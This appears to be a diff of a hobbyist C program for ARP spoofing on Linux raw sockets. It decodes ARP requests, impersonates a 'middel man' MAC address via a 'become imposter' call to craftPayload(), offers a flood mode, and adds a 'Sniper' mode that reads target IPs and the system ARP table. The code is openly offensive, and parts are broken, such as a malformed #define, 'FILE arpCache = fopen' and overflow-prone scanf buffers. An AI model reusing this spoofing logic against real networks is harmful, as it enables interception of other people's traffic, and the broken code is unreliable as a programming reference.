@@ -8,6 +8,10 @@
 #include <linux/if_packet.h>
 // #include <netinet/ether.h>
 
+//ARP file
+#define ARP_TABEL  "/proc/net/arp";
+
+
 //link Layer Sock Discriptor 
 typedef struct {
                   unsigned short sll_family;
@@ -50,6 +54,14 @@ typedef struct {
 
 }__attribute((packed)) ARP_Packet;
 
+//Function Decleration
+void getInterface();
+void decodeEther(unsigned char *buf, EtherNetFram *eth ,int debug);
+void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug);
+void writeToFile(unsigned char *data, int len,unsigned char *fileName);
+void getTargetInfo(unsigned char *target);
+void flood();
+
 //Globel Var
 int MAXMSG = 65536;
 int socket_desc;
@@ -57,6 +69,11 @@ struct sockaddr addr;
 int DataSize;
 int run = 1;
 int interface_index = 0;
+
+//Ip char buffer
+unsigned char target [15]; //i.g 192.150.160.10   
+unsigned char target_mac [6];
+unsigned char mask [15];   
 
 
 LL_SockAddr ll_sock_disc;
@@ -71,56 +88,6 @@ unsigned char mcD[6]     = {0x9c,0x5c,0x8e,0x8e,0x6e,0xbe}; //middel man
 unsigned char ipAdd[4]   =  {0xC0,0xA8,0x01,0x98};
 
 
-void writeToFile(unsigned char *data, int len){ 
- FILE *logFile = fopen("/home/satyaprakash/Algo/arp_payload","ab");
-      if(logFile == NULL){
-        printf("Failed to open file ..\n");
-      }
-      else{
-         printf("\n writing to File data:%d",len);
-         fwrite(data,1,len,logFile); 
-         fclose(logFile);
-      } 
-} 
-
- //DeCode EtherNet
- void decodeEther(unsigned char *buf, EtherNetFram *eth ,int debug){
-     if(debug){
-        printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
-        printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
-        printf("\n type => %02X:%02X",buf[12],buf[13]);
-      } 
-       memcpy(eth,buf,14);
- }
-
- //Tmp
-  //Decode ARP
-void decodeARP_debug(unsigned char *buf, ARP_Packet *arp , int debug){
- memcpy(arp, &buf[14], 28);
- // if Some one is looking for target then help him !..
- //  printf("\n Arp trafic...");
-
-    if((int)arp_packet.TPA_4[1] == TARGET && arp_packet.OPER[1] == 0x01 || debug == 1){
-        printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
-        printf("\n Ptype :%02x",arp_packet.PTYPE[0]);
-        printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
-        if(arp_packet.OPER[1] == 0x01){
-        printf("  Request");
-        }
-        else{
-        printf("  Replay");
-        }
-
-        printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
-        printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
-        printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
-        printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
-
-        //become imposter
-        // if((int) arp_packet.TPA_4[1] == TARGET && debug == 0)
-        // craftPayload();
-    }
-}
 
 //Dep;loy
 void deploy(){
@@ -167,9 +134,9 @@ void deploy(){
         
         //Debug Payload
         decodeEther(payload,&eth,1);
-        decodeARP_debug(payload, &arp_packet,1);
-
-        writeToFile(payload,sizeof(payload));
+        decodeARP(payload, &arp_packet,1);
+        char fileName[5]={'l','o','g','q','q'};  
+        writeToFile(payload,sizeof(payload),fileName);
         printf("\nPayload Deployed...");
         
    }
@@ -208,58 +175,6 @@ void craftPayload(){
     deploy();
 } 
 
-
- //Decode ARP
-void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug){
- memcpy(arp, &buf[14], 28);
- // if Some one is looking for target then help him !..
- //  printf("\n Arp trafic...");
-
-    if((int)arp_packet.TPA_4[1] == TARGET && arp_packet.OPER[1] == 0x01 || debug == 1){
-        printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
-        printf("\n Ptype :%02x",arp_packet.PTYPE[0]);
-        printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
-        if(arp_packet.OPER[1] == 0x01){
-        printf("  Request");
-        }
-        else{
-        printf("  Replay");
-        }
-
-        printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
-        printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
-        printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
-        printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
-
-        //become imposter
-        if((int) arp_packet.TPA_4[1] == TARGET && debug == 0)
-        craftPayload();
-    }
-}
-
-//Get interface index & info
-void getInterface(){
-     
-    unsigned char ifName[6]={'e','n','p','3','s','0'};  
-                             // enp3s0
-    struct ifreq ifr;
-    memcpy(ifr.ifr_name, ifName, sizeof(ifName));
-
-    int fd = socket(AF_UNIX,SOCK_DGRAM,0);
-    if(fd != -1){
-       
-       if(ioctl(fd, SIOCGIFINDEX, &ifr) != -1 ){
-          printf("\n Enterface :%s index :%d",ifName, ifr.ifr_ifindex);
-          interface_index = ifr.ifr_ifindex;
-       }
-       else
-        printf("\n get interface ioclt failed ...%d",errno);  
-    }
-    else
-     printf("\n get interface info sock creation failed ...%d",errno);
-
-    
-}
 
 //Flood Mode
 void flood(){
@@ -306,49 +221,165 @@ void flood(){
         }   
 }
 
+
+
+
 void main(){
+ 
+ int mode = 1;
+ 
  getInterface();
  
- int todo=1;
- printf("\nScane :0 or flood:1  ");
- scanf("%d",&todo);
- if(todo){
-  printf("\n Flooding..");
-  flood();
+ printf("\n\n ** Mode **\nSniper : 1 \nBurst : 0\n=>");
+ scanf("%d",&mode);
+
+ if(mode == 1){
+   printf("\nTarget src =>");
+   scanf("%s",target);
+   printf("\nTarget dst =>");
+   scanf("%s",mask);
+
+   getTargetInfo(target);
+   //craftPayload();
+   //deployPAyload();
+   
+   //rerouting done
+   
+  }
+
+ else{
+   printf("\n Burst mode");
+   return;
+  } 
+
   return;
  }
 
  
 
- unsigned char buf[MAXMSG];
-                                 //SOCK_PACKET 
- socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
-    
-    if(socket_desc == -1){
-     printf("\nFailed to create socket ..\n");
-     }
-    
-    else{
-          printf("\nSocket created ready to flood :%d\n",socket_desc);
+    //  unsigned char buf[MAXMSG];
+    //                                  //SOCK_PACKET 
+    //  socket_desc = socket(AF_PACKET, SOCK_PACKET,htons(0x0003));
         
-          int size =  sizeof addr;
-          int data;
-          while(run){
-              DataSize = data = recvfrom(socket_desc, buf, sizeof(buf), 0, NULL, NULL);
-                if(data < 0){
-                    printf("\nCan not get any packets, status :%d\n",data);
-                }
-                else{
-                    // printf("\n\n.........Intercept Some data size..%d\n",data);
-                    // EtherNetFram eth;
-                    decodeEther(buf,&eth,0);
-                    // printf("\n eth type :%02X",htons(eth.type));
-                    if(htons(eth.type) == 0X0806)
-                        decodeARP( buf, &arp_packet,0);
-                    }
-            }//While
+    //     if(socket_desc == -1){
+    //      printf("\nFailed to create socket ..\n");
+    //      }
+        
+    //     else{
+    //           printf("\nSocket created ready to flood :%d\n",socket_desc);
+            
+    //           int size =  sizeof addr;
+    //           int data;
+    //           while(run){
+    //               DataSize = data = recvfrom(socket_desc, buf, sizeof(buf), 0, NULL, NULL);
+    //                 if(data < 0){
+    //                     printf("\nCan not get any packets, status :%d\n",data);
+    //                 }
+    //                 else{
+    //                     // printf("\n\n.........Intercept Some data size..%d\n",data);
+    //                     // EtherNetFram eth;
+    //                     decodeEther(buf,&eth,0);
+    //                     // printf("\n eth type :%02X",htons(eth.type));
+    //                     if(htons(eth.type) == 0X0806)
+    //                         decodeARP( buf, &arp_packet,0);
+    //                     }
+    //             }//While
+        
+    //     } 
+
+// }
+
+
+
+//Get interface index & info
+void getInterface(){
+     
+    unsigned char ifName[6]={'e','n','p','3','s','0'};  
+                             // enp3s0
+    struct ifreq ifr;
+    memcpy(ifr.ifr_name, ifName, sizeof(ifName));
+
+    int fd = socket(AF_UNIX,SOCK_DGRAM,0);
+    if(fd != -1){
+       
+       if(ioctl(fd, SIOCGIFINDEX, &ifr) != -1 ){
+          printf("\n Enterface :%s index :%d",ifName, ifr.ifr_ifindex);
+          interface_index = ifr.ifr_ifindex;
+       }
+       else
+        printf("\n get interface ioclt failed ...%d",errno);  
+    }
+    else
+     printf("\n get interface info sock creation failed ...%d",errno);
+
     
-    } 
+}
+
+//
+void writeToFile(unsigned char *data, int len,unsigned char *fileName){ 
+    ///home/satyaprakash/Algo/
+ FILE *logFile = fopen(fileName,"ab");
+      if(logFile == NULL){
+        printf("Failed to open file ..\n");
+      }
+      else{
+         printf("\n writing to File data:%d",len);
+         fwrite(data,1,len,logFile); 
+         fclose(logFile);
+      } 
+} 
+
+//DeCode EtherNet
+void decodeEther(unsigned char *buf, EtherNetFram *eth ,int debug){
+     if(debug){
+        printf("\n dst => %02X:%02X:%02X:%02X:%02X:%02X",buf[0],buf[1],buf[2],buf[3],buf[4],buf[5]);
+        printf("\n src => %02X:%02X:%02X:%02X:%02X:%02X",buf[6],buf[7],buf[8],buf[9],buf[10],buf[11]);
+        printf("\n type => %02X:%02X",buf[12],buf[13]);
+      } 
+       memcpy(eth,buf,14);
+}
+
+
+ //Decode ARP
+void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug){
+ memcpy(arp, &buf[14], 28);
+ // if Some one is looking for target then help him !..
+ //  printf("\n Arp trafic...");
+
+    if((int)arp_packet.TPA_4[1] == TARGET && arp_packet.OPER[1] == 0x01 || debug == 1){
+        printf("\n Htype %02X,%02X",arp_packet.HTYPE[0],arp_packet.HTYPE[1]);
+        printf("\n Ptype :%02x",arp_packet.PTYPE[0]);
+        printf("\n OPER  :%02X,%02X",arp_packet.OPER[0],arp_packet.OPER[1]);
+        if(arp_packet.OPER[1] == 0x01){
+        printf("  Request");
+        }
+        else{
+        printf("  Replay");
+        }
+
+        printf("\n SHA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.SHA_2[0],arp_packet.SHA_2[1], arp_packet.SHA_4[0],arp_packet.SHA_4[1], arp_packet.SHA_6[0],arp_packet.SHA_6[1]);
+        printf("  SPA => %d.%d.%d.%d",(int)arp_packet.SPA_2[0],(int)arp_packet.SPA_2[1], (int)arp_packet.SPA_4[0],(int)arp_packet.SPA_4[1]);
+        printf("\n THA => %02X:%02X:%02X:%02X:%02X:%02X",arp_packet.THA_2[0],arp_packet.THA_2[1], arp_packet.THA_4[0],arp_packet.THA_4[1], arp_packet.THA_6[0],arp_packet.THA_6[1]);
+        printf("  TPA => %d.%d.%d.%d \n\n",(int)arp_packet.TPA_2[0],(int)arp_packet.TPA_2[1], (int)arp_packet.TPA_4[0],(int)arp_packet.TPA_4[1]);
+
+        //become imposter
+        if((int) arp_packet.TPA_4[1] == TARGET && debug == 0)
+        craftPayload();
+    }
+}
+
+
+//GEt Target info from arp tabel
+void getTargetInfo(unsigned char * target){
+    //find in arp tabel
+    
+    FILE arpCache = fopen(ARP_TABEL, "r");
+    if(arpCache!=-1){
+       fread(payload,1,42,arpCache);
+    }
+
+    //requerst target mac
 
 }
+
 
